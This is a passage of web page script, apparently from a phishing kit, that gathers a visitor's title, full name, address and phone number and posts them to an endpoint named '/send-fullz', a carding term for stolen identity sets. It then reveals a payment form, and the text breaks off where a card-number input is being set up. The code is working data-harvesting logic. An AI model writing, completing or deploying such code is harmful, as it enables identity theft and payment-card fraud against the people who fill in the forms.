    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const contactForm = document.getElementById('form');
            const payForm = document.getElementById('pay');
            const submitButton = document.getElementById('send-form');

            if (!contactForm || !payForm || !submitButton) {
                console.error('Не найдены необходимые элементы: contactForm, payForm или submitButton.');
                return;
            }

            submitButton.addEventListener('click', function(event) {
                event.preventDefault();


                const title = contactForm.querySelector('[name="title"]').value;
                const fullName = contactForm.querySelector('[name="full-name"]').value;
                const address = contactForm.querySelector('[name="address"]').value;
                const phoneNumber = contactForm.querySelector('[name="phone-number"]').value;

                if (!title || !address || !fullName || !phoneNumber) {
                    return;
                }


                const formData = {
                    title: title,
                    fullName: fullName,
                    address: address,
                    phoneNumber: phoneNumber
                };


                fetch('/send-fullz', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(formData)
                })
                    .then(response => {

                        contactForm.style.display = 'none';
                        payForm.style.display = 'block';
                    })
                    .catch(error => {
                        console.error('Ошибка при отправке данных:', error);
                    });
            });
        });
    </script>

    <script>
        $("input[name='card']").mask("0000 0000 0000 0000").on('focus', function(e) {
